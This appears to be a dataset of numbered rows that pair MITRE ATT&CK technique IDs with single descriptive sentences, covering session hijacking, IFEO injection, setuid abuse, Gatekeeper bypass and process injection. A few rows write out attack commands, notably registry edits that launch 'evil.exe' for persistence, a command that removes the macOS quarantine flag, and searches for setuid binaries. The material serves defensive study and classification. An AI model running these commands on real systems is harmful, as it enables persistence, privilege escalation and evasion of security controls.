7243,T1185,T1185,Browser Session Hijacking,"This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed."
7244,T1185,T1185,Browser Session Hijacking,The adversary assumes the security context of whichever browser process the proxy is injected into.
7245,T1185,T1185,Browser Session Hijacking,Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly.
7246,T1185,T1185,Browser Session Hijacking,"With these permissions, an adversary could potentially browse to any resource on an intranet, such as Sharepoint, or webmail, that is accessible through the browser and which the browser has sufficient permissions."
7247,T1185,T1185,Browser Session Hijacking,Browser pivoting may also bypass security provided by 2-factor authentication.

7260,T1021,T1021,Remote Services,"Adversaries may use Valid Accounts, to log into a service that accepts remote connections, such as telnet, SSH, and VNC."
7261,T1021,T1021,Remote Services,"In an enterprise environment, servers and workstations can be organized into domains."
7262,T1021,T1021,Remote Services,"Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network."

7304,T1556,T1556.007,Hybrid Identity,These can be maintained in a number of ways.
7305,T1556,T1556.007,Hybrid Identity,"For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD:
* Password Hash Synchronization , in which a privileged on-premises account synchronizes user password hashes between Active Directory and Azure AD, allowing authentication to Azure AD to take place entirely in the cloud 
* Pass Through Authentication , in which Azure AD authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory 
* Active Directory Federation Services , in which a trust relationship is established between Active Directory and Azure AD 
AD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges."
7306,T1556,T1556.007,Hybrid Identity,"By modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources."
7307,T1556,T1556.007,Hybrid Identity,"For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials."
7308,T1556,T1556.007,Hybrid Identity,"In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies."
7309,T1556,T1556.007,Hybrid Identity,"In some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud."
7310,T1556,T1556.007,Hybrid Identity,"For example, adversaries who compromise a Global Administrator account in an Azure AD tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Azure AD environment as any user."

7659,T1574,T1574.008,Path Interception by Search Order Hijacking,Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs.
7660,T1574,T1574.008,Path Interception by Search Order Hijacking,"Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program."
7661,T1574,T1574.008,Path Interception by Search Order Hijacking,Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path.
7662,T1574,T1574.008,Path Interception by Search Order Hijacking,"Unlike DLL Search Order Hijacking,, the search order differs depending on the method that is used to execute the program."
7663,T1574,T1574.008,Path Interception by Search Order Hijacking,"However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory."
7664,T1574,T1574.008,Path Interception by Search Order Hijacking,"An adversary who finds a program vulnerable to search order hijacking , a program that does not specify the path to an executable may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory."
7665,T1574,T1574.008,Path Interception by Search Order Hijacking,"For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument net user."
7666,T1574,T1574.008,Path Interception by Search Order Hijacking,"An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net."
7667,T1574,T1574.008,Path Interception by Search Order Hijacking,"In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then cmd.exe /C net user will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT."
7668,T1574,T1574.008,Path Interception by Search Order Hijacking,"Search order hijacking is also a common practice for hijacking DLL loads and is covered in DLL Search Order Hijacking,."
7669,T1491,T1491,Defacement,"Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content."
7670,T1491,T1491,Defacement,"Reasons for Defacement, include delivering messaging, intimidation, or claiming  credit for an intrusion."
7671,T1491,T1491,Defacement,"Disturbing or offensive images may be used as a part of Defacement, in order to cause user discomfort, or to pressure compliance with accompanying messages."
7672,T1535,T1535,Unused/Unsupported Cloud Regions,Adversaries may create cloud instances in unused geographic service regions in order to evade detection.
7673,T1535,T1535,Unused/Unsupported Cloud Regions,Access is usually obtained through compromising accounts used to manage cloud infrastructure.
7674,T1535,T1535,Unused/Unsupported Cloud Regions,"Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements."
7675,T1535,T1535,Unused/Unsupported Cloud Regions,"Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions."
7676,T1535,T1535,Unused/Unsupported Cloud Regions,"If an adversary creates resources in an unused region, they may be able to operate undetected."
7677,T1535,T1535,Unused/Unsupported Cloud Regions,A variation on this behavior takes advantage of differences in functionality across cloud regions.
7678,T1535,T1535,Unused/Unsupported Cloud Regions,An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.
7679,T1535,T1535,Unused/Unsupported Cloud Regions,"An example of adversary use of unused AWS regions is to mine cryptocurrency through Resource Hijacking,, which can cost organizations substantial amounts of money over time depending on the processing power used."
7680,T1557,T1557.003,DHCP Spoofing,Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol  traffic and acting as a malicious DHCP server on the victim network.
7681,T1557,T1557.003,DHCP Spoofing,"By achieving the adversary-in-the-middle  position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols."
7682,T1557,T1557.003,DHCP Spoofing,"This may also enable follow-on behaviors such as Network Sniffing, or Transmitted Data Manipulation,."
7683,T1557,T1557.003,DHCP Spoofing,DHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.
7684,T1557,T1557.003,DHCP Spoofing,"The typical server-client interaction is as follows: 
1."
7685,T1557,T1557.003,DHCP Spoofing,The client broadcasts a `DISCOVER` message.
7686,T1557,T1557.003,DHCP Spoofing,"The server responds with an `OFFER` message, which includes an available network address."
7687,T1557,T1557.003,DHCP Spoofing,"The client broadcasts a `REQUEST` message, which includes the network address offered."
7688,T1557,T1557.003,DHCP Spoofing,The server acknowledges with an `ACK` message and the client receives the network configuration parameters.
7689,T1557,T1557.003,DHCP Spoofing,"Adversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations."
7690,T1557,T1557.003,DHCP Spoofing,"For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers."
7691,T1557,T1557.003,DHCP Spoofing,"Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network."
7692,T1557,T1557.003,DHCP Spoofing,DHCPv6 clients can receive network configuration information without being assigned an IP address by sending a INFORMATION-REQUEST  message to the All_DHCP_Relay_Agents_and_Servers multicast address.
7693,T1557,T1557.003,DHCP Spoofing,Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.
7694,T1557,T1557.003,DHCP Spoofing,"Rather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack  Service Exhaustion Flood, by generating many broadcast DISCOVER messages to exhaust a network’s DHCP allocation pool."
7695,T1155,T1155,AppleScript,macOS and OS X applications send AppleEvent messages to each other for interprocess communications .
7696,T1155,T1155,AppleScript,These messages can be easily scripted with AppleScript for local or remote IPC.
7697,T1155,T1155,AppleScript,Osascript executes AppleScript and any other Open Scripting Architecture  language scripts.
7698,T1155,T1155,AppleScript,A list of OSA languages installed on a system can be found by using the osalang program.
7699,T1155,T1155,AppleScript,AppleEvent messages can be sent independently or as part of a script.
7700,T1155,T1155,AppleScript,"Adversaries can use this to interact with open SSH connection, move to remote machines, and even present users with fake dialog boxes."
7701,T1155,T1155,AppleScript,"These events cannot start applications remotely , but can interact with applications if they're already running remotely."
7702,T1155,T1155,AppleScript,"Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via python  ."
7703,T1563,T1563,Remote Service Session Hijacking,Adversaries may take control of preexisting sessions with remote services to move laterally in an environment.
7704,T1563,T1563,Remote Service Session Hijacking,"Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP."
7705,T1563,T1563,Remote Service Session Hijacking,"When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service."
7706,T1563,T1563,Remote Service Session Hijacking,Adversaries may commandeer these sessions to carry out actions on remote systems.
7707,T1563,T1563,Remote Service Session Hijacking,"Remote Service Session Hijacking, differs from use of Remote Services, because it hijacks an existing session rather than creating a new session using Valid Accounts,."
7708,T1027,T1027.001,Binary Padding,Adversaries may use binary padding to add junk data and change the on-disk representation of malware.
7709,T1027,T1027.001,Binary Padding,"This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations."
7710,T1027,T1027.001,Binary Padding,Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.
7711,T1027,T1027.001,Binary Padding,"TAINTEDSCRIBE, can execute FileRecvWriteRand to append random bytes to the end of a file received from C2."

7900,T1183,T1183,Image File Execution Options Injection,"When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger ."
7901,T1183,T1183,Image File Execution Options Injection,IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.
7902,T1183,T1183,Image File Execution Options Injection,IFEOs are represented as Debugger values in the Registry under HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable> where <executable> is the binary on which the debugger is attached.
7903,T1183,T1183,Image File Execution Options Injection,"IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits  is prematurely terminated by itself or a second, non kernel-mode process."
7904,T1183,T1183,Image File Execution Options Injection,"Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\."
7905,T1183,T1183,Image File Execution Options Injection,"An example where the evil.exe process is started when notepad.exe exits: 
* reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"" /v GlobalFlag /t REG_DWORD /d 512
* reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"" /v ReportingMode /t REG_DWORD /d 1
* reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"" /v MonitorProcess /d ""C:\temp\evil.exe""
Similar to Process Injection,, these values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer."
7906,T1183,T1183,Image File Execution Options Injection,Installing IFEO mechanisms may also provide Persistence via continuous invocation.
7907,T1183,T1183,Image File Execution Options Injection,Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications.
7908,T1085,T1085,Rundll32,The rundll32.exe program can be called to execute an arbitrary binary.
7909,T1085,T1085,Rundll32,Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.
7910,T1085,T1085,Rundll32,Rundll32.exe can be used to execute Control Panel Item files  through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser.

7923,T1546,T1546.005,Trap,Adversaries may establish persistence by executing malicious content triggered by an interrupt signal.
7924,T1546,T1546.005,Trap,The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals.
7925,T1546,T1546.005,Trap,A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d.
7926,T1546,T1546.005,Trap,Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism.
7927,T1546,T1546.005,Trap,"Trap commands are of the following format trap 'command list' signals where ""command list"" will be executed when ""signals"" are received."
7928,T1574,T1574.006,Dynamic Linker Hijacking,Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries.
7929,T1574,T1574.006,Dynamic Linker Hijacking,"During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS."
7930,T1574,T1574.006,Dynamic Linker Hijacking,"Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name."
7931,T1574,T1574.006,Dynamic Linker Hijacking,"These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library."
7932,T1574,T1574.006,Dynamic Linker Hijacking,"On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges."

8122,T1179,T1179,Hooking,Windows processes often leverage application programming interface  functions to perform tasks that require reusable system resources.
8123,T1179,T1179,Hooking,Windows API functions are typically stored in dynamic-link libraries  as exported functions.
8124,T1179,T1179,Hooking,"Hooking involves redirecting calls to these functions and can be implemented via:
* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs."
8125,T1179,T1179,Hooking,"* **Import address table  hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored."
8126,T1179,T1179,Hooking,"* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow."
8127,T1179,T1179,Hooking,"Similar to Process Injection,, adversaries may use hooking to load and execute malicious code within the context of another process, masking the execution while also allowing access to the process's memory and possibly elevated privileges."
8128,T1179,T1179,Hooking,Installing hooking mechanisms may also provide Persistence via continuous invocation when the functions are called through normal use.
8129,T1179,T1179,Hooking,Malicious hooking mechanisms may also capture API calls that include parameters that reveal user authentication credentials for Credential Access.
8130,T1179,T1179,Hooking,"Hooking is commonly utilized by Rootkit,s to conceal files, processes, Registry keys, and other objects in order to hide malware and associated behaviors."
8131,T1595,T1595,Active Scanning,Adversaries may execute active reconnaissance scans to gather information that can be used during targeting.
8132,T1595,T1595,Active Scanning,"Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction."
8133,T1595,T1595,Active Scanning,Adversaries may perform different forms of active scanning depending on what information they seek to gather.
8134,T1595,T1595,Active Scanning,"These scans can also be performed in various ways, including using native features of network protocols such as ICMP."
8135,T1595,T1595,Active Scanning,"Information from these scans may reveal opportunities for other forms of reconnaissance  or Search Open Technical Databases,, establishing operational resources  or Obtain Capabilities,, and/or initial access  or Exploit Public-Facing Application,."
8136,T1547,T1547.011,Plist Modification,Adversaries can modify property list files  to execute their code as part of establishing persistence.
8137,T1547,T1547.011,Plist Modification,Plist files are used by macOS applications to store properties and configuration settings for applications and services.
8138,T1547,T1547.011,Plist Modification,"Applications use information plist files, Info.plist, to tell the operating system how to handle the application at runtime using structured metadata in the form of keys and values."
8139,T1547,T1547.011,Plist Modification,Plist files are formatted in XML and based on Apple's Core Foundation DTD and can be saved in text or binary format.
8140,T1547,T1547.011,Plist Modification,"Adversaries can modify paths to executed binaries, add command line arguments, and insert key/pair values to plist files in auto-run locations which execute upon user logon or system startup."
8141,T1547,T1547.011,Plist Modification,"Through modifying plist files in these locations, adversaries can also execute a malicious dynamic library  by adding a dictionary containing the DYLD_INSERT_LIBRARIES key combined with a path to a malicious dylib under the EnvironmentVariables key in a plist file."
8142,T1547,T1547.011,Plist Modification,"Upon user logon, the plist is called for execution and the malicious dylib is executed within the process space."
8143,T1547,T1547.011,Plist Modification,Persistence can also be achieved by modifying the LSEnvironment key in the application's Info.plist file.
8144,T1547,T1547.011,Plist Modification,"XCSSET, uses the plutil command to modify the LSUIElement, DFBundleDisplayName, and CFBundleIdentifier keys in the /Contents/Info.plist file."

8149,T1548,T1548,Abuse Elevation Control Mechanism,Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions.
8150,T1548,T1548,Abuse Elevation Control Mechanism,Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine.
8151,T1548,T1548,Abuse Elevation Control Mechanism,Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.
8152,T1548,T1548,Abuse Elevation Control Mechanism,An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.
8153,T1134,T1134.002,Create Process with Token,Adversaries may create a new process with an existing token to escalate privileges and bypass access controls.
8154,T1134,T1134.002,Create Process with Token,Processes can be created with the token and resulting security context of another user using features such as CreateProcessWithTokenW and runas.
8155,T1134,T1134.002,Create Process with Token,"Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used."
8156,T1134,T1134.002,Create Process with Token,"For example, the token could be duplicated via Token Impersonation/Theft, or created via Make and Impersonate Token, before being used to create a process."
8157,T1134,T1134.002,Create Process with Token,"While this technique is distinct from Token Impersonation/Theft,, the techniques can be used in conjunction where a token is duplicated and then used to create a new process."
8158,T1134,T1134.002,Create Process with Token,"Azorult, can call WTSQueryUserToken and CreateProcessAsUser to start a new process with local system privileges."

8167,T1134,T1134.002,Create Process with Token,"Lazarus Group, keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call CreateProcessAsUserA under that user's context."
8168,T1548,T1548.001,Setuid and Setgid,An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different  user’s context.
8169,T1548,T1548.001,Setuid and Setgid,"On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively."
8170,T1548,T1548.001,Setuid and Setgid,"Normally an application is run in the current user’s context, regardless of which user or group owns the application."
8171,T1548,T1548.001,Setuid and Setgid,"However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges."
8172,T1548,T1548.001,Setuid and Setgid,"Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications  Linux and Mac File and Directory Permissions Modification,."
8173,T1548,T1548.001,Setuid and Setgid,"The chmod command can set these bits with bitmasking, chmod 4777 file, or via shorthand naming, chmod u+s file,."
8174,T1548,T1548.001,Setuid and Setgid,This will enable the setuid bit.
8175,T1548,T1548.001,Setuid and Setgid,"To enable the setgid bit, chmod 2775 and chmod g+s can be used."
8176,T1548,T1548.001,Setuid and Setgid,Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.
8177,T1548,T1548.001,Setuid and Setgid,"This abuse is often part of a ""shell escape"" or other actions to bypass an execution environment with restricted permissions."
8178,T1548,T1548.001,Setuid and Setgid,"Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled  File and Directory Discovery,."
8179,T1548,T1548.001,Setuid and Setgid,"The setuid and setguid bits are indicated with an ""s"" instead of an ""x"" when viewing a file's attributes via ls -l. The find command can also be used to search for such files."
8180,T1548,T1548.001,Setuid and Setgid,"For example, find / -perm +4000 2>/dev/null can be used to find files with setuid set and find / -perm +2000 2>/dev/null may be used for setgid."
8181,T1548,T1548.001,Setuid and Setgid,Binaries that have these bits set may then be abused by adversaries.
8182,T1548,T1548.001,Setuid and Setgid,"Keydnap, adds the setuid flag to a binary so it can easily elevate in the future."

8376,T1546,T1546.012,Image File Execution Options Injection,"Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\."
8377,T1546,T1546.012,Image File Execution Options Injection,"Similar to Accessibility Features,, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program ."
8378,T1546,T1546.012,Image File Execution Options Injection,"After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with Remote Desktop Protocol, will cause the ""debugger"" program to be executed with SYSTEM privileges."
8379,T1546,T1546.012,Image File Execution Options Injection,"Similar to Process Injection,, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer."
8380,T1546,T1546.012,Image File Execution Options Injection,Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.
8381,T1546,T1546.012,Image File Execution Options Injection,"Malware may also use IFEO to Impair Defenses, by registering invalid debuggers that redirect and effectively disable various system and security applications."

8385,T1218,T1218.008,Odbcconf,Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads.
8386,T1218,T1218.008,Odbcconf,Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity  drivers and data source names.
8387,T1218,T1218.008,Odbcconf,The Odbcconf.exe binary may be digitally signed by Microsoft.
8388,T1218,T1218.008,Odbcconf,Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse.
8389,T1218,T1218.008,Odbcconf,"Similar to Regsvr32,, odbcconf.exe has a REGSVR flag that can be misused to execute DLLs ."

8392,T1593,T1593.002,Search Engines,Adversaries may use search engines to collect information about victims that can be used during targeting.
8393,T1593,T1593.002,Search Engines,Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content  filetypes.
8394,T1593,T1593.002,Search Engines,Adversaries may craft various search engine queries depending on what information they seek to gather.
8395,T1593,T1593.002,Search Engines,"Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials."
8396,T1593,T1593.002,Search Engines,"Kimsuky, has searched for vulnerabilities, tools, and geopolitical trends on Google to target victims."
8397,T1177,T1177,LSASS Driver,The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain.
8398,T1177,T1177,LSASS Driver,The Local Security Authority  is the main component responsible for local security policy and user authentication.
8399,T1177,T1177,LSASS Driver,"The LSA includes multiple dynamic link libraries  associated with various other security functions, all of which run in the context of the LSA Subsystem Service  lsass.exe process."
8400,T1177,T1177,LSASS Driver,Adversaries may target lsass.exe drivers to obtain execution and/or persistence.
8401,T1177,T1177,LSASS Driver,"By either replacing or adding illegitimate drivers  or DLL Search Order Hijacking,, an adversary can achieve arbitrary code execution triggered by continuous LSA operations."
8402,T1591,T1591.002,Business Relationships,Adversaries may gather information about the victim's business relationships that can be used during targeting.
8403,T1591,T1591.002,Business Relationships,"Information about an organization’s business relationships may include a variety of details, including second or third-party organizations/domains  that have connected  network access."
8404,T1591,T1591.002,Business Relationships,This information may also reveal supply chains and shipment paths for the victim’s hardware and software resources.
8405,T1591,T1591.002,Business Relationships,"Information about business relationships may also be exposed to adversaries via online or other accessible data sets  or Search Victim-Owned Websites,."
8406,T1591,T1591.002,Business Relationships,"Gathering this information may reveal opportunities for other forms of reconnaissance  or Search Open Websites/Domains,, establishing operational resources  or Compromise Accounts,, and/or initial access , Drive-by Compromise,, or Trusted Relationship,."
8407,T1591,T1591.002,Business Relationships,"Dragonfly, has collected open source information to identify relationships between organizations for targeting purposes."

8410,T1548,T1548.005,Temporary Elevated Cloud Access,Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources.
8411,T1548,T1548.005,Temporary Elevated Cloud Access,"Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own."
8412,T1548,T1548.005,Temporary Elevated Cloud Access,"Just-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner."
8413,T1548,T1548.005,Temporary Elevated Cloud Access,"This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary."
8414,T1548,T1548.005,Temporary Elevated Cloud Access,"Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted."
8415,T1548,T1548.005,Temporary Elevated Cloud Access,Account impersonation allows user or service accounts to temporarily act with the permissions of another account.
8416,T1548,T1548.005,Temporary Elevated Cloud Access,"For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts."
8417,T1548,T1548.005,Temporary Elevated Cloud Access,"In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts."
8418,T1548,T1548.005,Temporary Elevated Cloud Access,Many cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services.
8419,T1548,T1548.005,Temporary Elevated Cloud Access,"While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted."
8420,T1548,T1548.005,Temporary Elevated Cloud Access,"In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource."
8421,T1548,T1548.005,Temporary Elevated Cloud Access,"While users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions."
8422,T1548,T1548.005,Temporary Elevated Cloud Access,This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.
8423,T1548,T1548.005,Temporary Elevated Cloud Access,"**Note:** this technique is distinct from Additional Cloud Roles,, which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources."
8424,T1548,T1548.005,Temporary Elevated Cloud Access,"However, adversaries that compromise a sufficiently privileged account may grant another account they control Additional Cloud Roles, that would allow them to also abuse these features."
8425,T1548,T1548.005,Temporary Elevated Cloud Access,"This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place."
8426,T1125,T1125,Video Capture,An adversary can leverage a computer's peripheral devices  or applications  to capture video recordings for the purpose of gathering information.
8427,T1125,T1125,Video Capture,"Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files."
8428,T1125,T1125,Video Capture,Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images.
8429,T1125,T1125,Video Capture,Video or image files may be written to disk and exfiltrated later.
8430,T1125,T1125,Video Capture,"This technique differs from Screen Capture, due to use of specific devices or applications for video recording rather than capturing the victim's screen."
8431,T1125,T1125,Video Capture,"In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton."

8455,T1144,T1144,Gatekeeper Bypass,"In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called com.apple.quarantine."
8456,T1144,T1144,Gatekeeper Bypass,This attribute is read by Apple's Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution.
8457,T1144,T1144,Gatekeeper Bypass,"Apps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network won’t set this flag."
8458,T1144,T1144,Gatekeeper Bypass,"Additionally, other utilities or events like drive-by downloads don’t necessarily set it either."
8459,T1144,T1144,Gatekeeper Bypass,This completely bypasses the built-in Gatekeeper check.
8460,T1144,T1144,Gatekeeper Bypass,The presence of the quarantine flag can be checked by the xattr command xattr /path/to/MyApp.app for com.apple.quarantine.
8461,T1144,T1144,Gatekeeper Bypass,"Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well, sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app."
8462,T1144,T1144,Gatekeeper Bypass,"In typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk."
8463,T1144,T1144,Gatekeeper Bypass,"When the user tries to open the file or application, macOS’s gatekeeper will step in and check for the presence of this flag."
8464,T1144,T1144,Gatekeeper Bypass,"If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the URL where the application came from."
8465,T1144,T1144,Gatekeeper Bypass,"However, this is all based on the file being downloaded from a quarantine-savvy application."
8466,T1045,T1045,Software Packing,Software packing is a method of compressing or encrypting an executable.
8467,T1045,T1045,Software Packing,Packing an executable changes the file signature in an attempt to avoid signature-based detection.
8468,T1045,T1045,Software Packing,Most decompression techniques decompress the executable code in memory.
8469,T1045,T1045,Software Packing,Utilities used to perform software packing are called packers.
8470,T1045,T1045,Software Packing,Example packers are MPRESS and UPX.
8471,T1045,T1045,Software Packing,"A more comprehensive list of known packers is available,  but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses."
8472,T1045,T1045,Software Packing,Adversaries may use virtual machine software protection as a form of software packing to protect their code.
8473,T1045,T1045,Software Packing,Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run.
8474,T1045,T1045,Software Packing,A virtual machine is then called to run this code.
8475,T1045,T1045,Software Packing,"This CAPEC has been deprecated because it is not directly related to a weakness, social engineering, supply chains, or a physical-based attack."
8476,T1045,T1045,Software Packing,"Group5, packed an executable by base64 encoding the PE file and breaking it up into numerous lines."
8477,T1045,T1045,Software Packing,"APT32, uses UPX to pack their macOS backdoor."
8478,T1055,T1055.013,Process Doppelgänging,Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges.
8479,T1055,T1055.013,Process Doppelgänging,Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process.
8480,T1055,T1055.013,Process Doppelgänging,Windows Transactional NTFS  was introduced in Vista as a method to perform safe file operations.
8481,T1055,T1055.013,Process Doppelgänging,"To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time."
8482,T1055,T1055.013,Process Doppelgänging,"Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened."
8483,T1055,T1055.013,Process Doppelgänging,"To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction."
8484,T1055,T1055.013,Process Doppelgänging,"Although deprecated, the TxF application programming interface  is still enabled as of Windows 10."
8485,T1055,T1055.013,Process Doppelgänging,"Adversaries may abuse TxF to a perform a file-less variation of Process Injection,."
8486,T1055,T1055.013,Process Doppelgänging,"Similar to Process Hollowing,, process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection."
